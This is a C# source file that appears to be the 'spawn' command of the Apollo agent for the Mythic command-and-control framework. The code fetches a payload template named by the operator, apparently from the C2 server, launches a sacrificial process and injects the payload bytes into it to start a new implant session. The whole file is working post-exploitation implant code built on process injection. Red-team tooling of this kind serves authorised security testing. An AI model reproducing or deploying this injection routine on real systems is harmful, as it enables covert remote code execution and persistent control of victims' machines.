#define COMMAND_NAME_UPPER

#if DEBUG
#define SPAWN
#endif

#if SPAWN

using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;
using System.Text;
using ST = System.Threading.Tasks;

namespace Tasks
{
    public class spawn : Tasking
    {
        [DataContract]
        internal struct SpawnParameters
        {
            [DataMember(Name = "template")]
            public string Template;
        }
        public spawn(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
        {
        }


        public override void Start()
        {
            TaskResponse resp;
            SpawnParameters parameters = _jsonSerializer.Deserialize<SpawnParameters>(_data.Parameters);
            if (_agent.GetFileManager().GetFile(
                    _cancellationToken.Token,
                    _data.ID,
                    parameters.Template,
                    out byte[] fileBytes))
            {
                var startupArgs = _agent.GetProcessManager().GetStartupInfo();
                var proc = _agent.GetProcessManager().NewProcess(startupArgs.Application, startupArgs.Arguments, true);
                if (proc.Start())
                {
                    if (proc.Inject(fileBytes))
                    {
                        resp = CreateTaskResponse($"Successfully injected into {startupArgs.Application} ({proc.PID})", true);
                    }
                    else
                    {
                        resp = CreateTaskResponse("Failed to inject into sacrificial process.", true, "error");
                    }
                }
                else
                {
                    resp = CreateTaskResponse("Failed to start sacrificial process.", true, "error");
                }
            }
            else
            {
                resp = CreateTaskResponse("Failed to fetch file.", true, "error");
            }

            // Your code here..
            // Then add response to queue
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}

#endif